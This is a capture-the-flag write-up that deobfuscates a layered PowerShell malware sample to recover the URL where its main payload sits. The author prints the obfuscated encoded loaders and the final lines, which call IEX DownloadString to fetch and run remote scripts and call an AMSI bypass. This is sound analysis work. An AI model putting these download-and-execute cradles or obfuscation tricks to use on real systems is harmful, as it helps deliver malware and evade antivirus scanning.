---
title: NDH16/Wavestone - Step 2 - Give yourshellf strength
authors: Crypt0_M3lon
layout: writeup
---

## Challenge description
> Starting from the decoded file you found in challenge #1, you now have to identify the URL contacted by the malicious script.
> 
> In order to validate this challenge, you have to submit the full URL (*proto://domain.tld/filename.ext*) where the main payload is retrieved.

## Solution 
The first step is to decode the base64-encoded payload from [step 1]({% post_url 2018-06-30-NDH16-Wavestone-Step1 %}). We obtain the following PowerShell 
```powershell
. ( $pSHome[21]+$PsHOme[30]+'x') ( NEW-OBJECT  sYSTem.Io.cOmprESsiON.DeFlATesTrEam([IO.MemORySTReAm] [cONVErt]::FROMbAse64strINg('TZRZj5tYEIX/ih9a023RMc1iMC3lAeNrwDa7WVtRxGZ2LptZnOS/jzV5mbdSfapSlY7OWf2zelu9ANn6DGFlNCD8It+x7Tu+/fEth6L8+rp+8jq2v8H9CXDXlahsOEVqOtD3oiJvovh2Ya+xce2AX7199Ut/BdJGhJsqrhR9MQY9Zqsfqy/jL+CgPIJu+PH5edMVae8bgCKfs1nNv61eZUtljHmagYo5fXaQBT0VpVylRZtPj2afZx8tI8weWLJzOUYn+8OXzGGsb8ji1yEneJVTP3YRFcZBOJ8wZESbiVHVLXUPCnJE1Ct+2vJ3J3ZytD7jLeFVlzGYkBtD4yjh4SHajZHD4+rQRrXretocpqV/fCxqog0YnBIkzQJRy+c55YvSNowKmvieR7rJKS6Tuei7o3huXIMMQW17NpHV5NlMxF71T/rR1RHXC6jzCU8Xnjdq8JgfiZHrkLlapD0UdKYX3h3sjCrd54dMgGxIpbIgHQqVy4Jbyt+hRqV2XoxjcD+RpdKymUS409ZLjqaeUPcoj7IjOwHzLMakRjWCRaZIYtYWhqjJss2nPTsDEoHClaUetbYLNdJlE2t+/maMrMR6RUNSc6Vymo6k5g18tJAYwhRIIB7kgOYkQ895CUQn6mwNbK+KZaDLYj5b4NATgpXPeCkSBz/b82E1XLAES5aKUx6Vq50ZJ+YR0WL1WryGkadkp5rXK4o/6srSEmUBWjcGS8MtVIdr3f5SQ+upTp10y1IajMsrUzLz2K6FBqxwTWxGXBCc7Dxb9NaeBZFLsJItkvtk8Tx5cYNiV1JqbIj0LXneeEI1XgibbJH2eok0mRtuzdnC1bi6cfNo5XJQtTLh7gnjGtlT1YaRTVsXIj0L1snimYlPvbaPhLPyCA6+dhAP1yY/YAK1LXCz7doko/yWh2x2dDSGS1rVLktsRnVm8jBxoIxqQhbNHG7NJdhDwAOzOfn8bv/BQBjpd6qnKBTCC5qgmWATMqbGePCB0aPX4Cnax7kW5Ue8j4maqjQGt5Sb/KCnh1w6gZChhJ8/XFyn0rnxz0SM9gzfLvnVQdWcRBx6RhHFuKvYHNcKat/J20hv0fERB0WG9pND7PB5ZMqA9kqfDgJ0+v79dbV+X31lcPNMAlWPDUOE9dOxktoBw8igXCkH8HRuBP7rPfl69Xt1VLqY5dJf/4uI3u0HUG0yZfM3FnTAHkD39vLz/WuI52ED6hBGYp08d/kGJ4rrP6vfN9jFfij8evm5eRaHK4zr6G39Z/0v'), [SYSTEM.Io.cOmpRessiOn.cOmPRESSIOnMOde]::DEcomPReSs)|FoReACH{NEW-OBJECT  io.STReAMREAdER($_ , [SYSTem.text.encOdINg]::ascii)}).REadTOenD( )
```
Not very surprising: more obfuscated PowerShell, let's analyse it.
`( $pSHome[21]+$PsHOme[30]+'x')` is just an obfuscated `IEX`, so we can execute the third part of the payload directly to deobfuscate it. We obtain the following result:
```powershell
& ( $ENV:comSpEc[4,15,25]-joIN'') ( neW-oBJECT IO.COMprEssION.defLATeSTrEam([sysTEM.Io.memORyStReAm] [SysTEM.CoNvErt]::fROMBaSE64STrinG( 'NVP9SxwxEP1XsiDNHRhIMjP7IWGhFUsji0q9HxZEyiKlvdJW0aMUtvnf+yancCHZmXnz8d6cebcxJ1+v/pw9PP56ubk4v+PT2J5GuXeXj/nK2q3ZmLvbw+f972/3Z2c/rvdXG2PtqdnYYZQxchlaFzyPgQt1owg+hibIQjxxhGklWSSmoU2BG+rwXkLwUyR8FIKpYS4cEnWZW3in4KUgIsPaJRFYR+YZb6KJ2hyGGSnEzxzgSjRo9TV4Wtk7iRkZuE8SmhBjDiHoAc6hNHMDkPCibfhGuoQ6hWjkvvbuJ4lOqAiM3Yw5ZgFURg6udjdiFAwEUKIe4Q6pHV4h+gUnV1+Pgy5jwBAxE4+oHTA6znQ8cQ4YAgVxgQtSvAMAZkp46xmPCQR+hUfE0qo3tchEMEetNb7CMSRjGMEdJ6KVtAsPIlbRNIjxVEDs3HVjx2lI3DaiBGcmtL1g1gymCOzmYQK9XeG+IVARnITcdZOiJnGRm6GFROyq3lkEqYeEypCy6r2QrBLnoV2q3ngryylS9YGOwgxG18qoSom2QIpv2HHXiKxV75WxHICg1lAkguwVGG4LYbk8l6PeSI7fglbRJ/QGHcpiyMBRl+piYc5UxV2PemfCxvVjNbmqN3YB3STdWwmqcdW7VL3hKHVJVG9wGhZqsdHKOzbDaQDIDTpjD1H65k2Uqrqgi6aqGoAiFXQ9CgqPWll1x/R9wZ1It6Smw+yQUtfpLbBoEGEUpJaG8B09oodRu6s66/ooL/g/iHW3N1Pe2b017vZp2h/sejQdjF2se3n6mQ92VOfNz7wzNlXbHi/3ajzY2R6hxpaK3e/s9GqyjTX/Pj4+X7x/+OSuP1xenO/Wu4fv75/vzebki/swX382xv9lb7Zla7bb/w==' ), [io.comPReSSIon.CoMPrESSioNmODE]::dECoMPreSS) | FOreACh{neW-oBJECT sYstEm.iO.STrEamREADEr($_,[text.EncodIng]::aSCII)} |foreacH{$_.reaDToend()})
```
More PowerShell! Again `( $ENV:comSpEc[4,15,25]-joIN'')` is just `IEX`, let's deobfuscate the third part:
```powershell
&( $eNv:comsPEC[4,26,25]-JoIN'') ( [StRing]::jOiN( '', ('9>5>24}96-104>14}37>55-109!15a34L42}37{35a52<96<14!37a52a110L23!37}34!3!44}41<37I46a52L105}110I4}47<55I46>44X47<33L36I19X52a50X41I46<39-104{103{40-52I52L48<51!122I111I111L36-37a44!41I54a37a50!57<110}33>48}37>50L52-53}50}37X109X51L35>41-37I46>35a37{110<38>50-111-38>120a120I37{118{116I121}112I34>36-114!114L114L112X119X37>119a113>120-121X113<120<120>121}115a116-112>113{112>36!113a112{118>113>120I114<115I112L33{38{110L48{51}113>103}105X77>74<9<46!54}47I43I37a109I1I13I19I9L2a57}48!33}51-51I77L74<9L5-24!96L104-14}37I55>109<15I34!42}37a35{52X96a14!37{52<110<23}37a34>3}44>41{37I46X52a105L110!4-47!55{46>44{47}33}36L19}52>50{41{46}39!104}103{40{52{52a48!51-122>111X111I36L37<44}41!54<37>50{57<110I33!48>37>50-52-53a50{37<109!51>35a41-37}46>35{37}110}38>50{111a36{35>113L35-35{33>112<118a118!118>113>36-115L37!113<116{33}115{116-115L33<114-121L118}121<34!113>112}33I117{115L33<114}118}34<33>35!34}120!119>110}48{51X113}103-105'-SPLIT'i' -SpLit'{'-SPLIt 'a'-splIt'>' -SPlIT '<'-spliT '-' -SPlIt'X'-SpLit '}'-SPLiT'L'-SpLit'!' |ForEAcH-OBJECT{[chAr] ($_-BXOR  0x40 )}) ))
```
Again, and again, and again :)
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://delivery.aperture-science.fr/f88e6490bd22207e7189188934010d10618230af.ps1')
Invoke-AMSIBypass
IEX (New-Object Net.WebClient).DownloadString('https://delivery.aperture-science.fr/dc1cca06661d3e14a343a2969b10a53a26bacb87.ps1')
```
Finally! The payload executes two remote scripts. The first one is the `Invoke-AmsiBypass` function from [Nishang](https://github.com/samratashok/nishang) and the second one is used to reflectively inject a PE in memory.

The second flag is **https://delivery.aperture-science.fr/dc1cca06661d3e14a343a2969b10a53a26bacb87.ps1**, the base64-encoded payload will be usefull for step 4 and 5.
